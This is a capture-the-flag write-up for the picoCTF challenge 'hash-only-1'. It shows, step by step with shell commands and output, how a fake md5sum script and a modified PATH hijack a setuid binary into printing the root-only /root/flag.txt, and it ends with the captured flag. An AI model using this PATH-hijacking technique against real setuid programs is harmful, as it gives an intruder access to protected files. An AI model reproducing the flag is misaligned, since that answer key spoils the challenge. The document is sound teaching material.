# hash-only-1

## Description
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
Connect using ssh ctf-player@shape-facility.picoctf.net -p 57114 with the password, fa005713 and run the binary named "flaghasher".
You can get a copy of the binary if you wish: scp -P 57114 ctf-player@shape-facility.picoctf.net:~/flaghasher 

## Solution

```sh
ctf-player@pico-chall$ ls
flaghasher
ctf-player@pico-chall$ file flaghasher
flaghasher: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c4fbd07a602b4570abdcfe273078247bdc96b5b2, for GNU/Linux 3.2.0, not stripped
ctf-player@pico-chall$ pwd
/home/ctf-player
ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....

8c9735f569157a799a98bd2014190786  /root/flag.txt
ctf-player@pico-chall$ sudo cat /root/flag.txt
-bash: sudo: command not found
```

```sh
ctf-player@pico-chall$ echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
ctf-player@pico-chall$ chmod +x md5sum
ctf-player@pico-chall$ export PATH=.:$PATH
ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}
```

We Create a Fake Version of `md5sum`
This creates a script called md5sum, which contains:
```sh
cat /root/flag.txt
```
So, every time the system runs `md5sum`, what it actually executes is the cat /root/flag.txt command

Then, We Manipulate the PATH Variable
* `.` means current directory.
* By putting `.` at the beginning of PATH, the system will look for programs in the current directory first before looking in `/usr/bin` or `/bin`.
* So, when `flaghasher` runs md5sum, the system will run the `md5sum` file we created, not `/usr/bin/md5sum`.

## Flag
    picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_63a87fa9}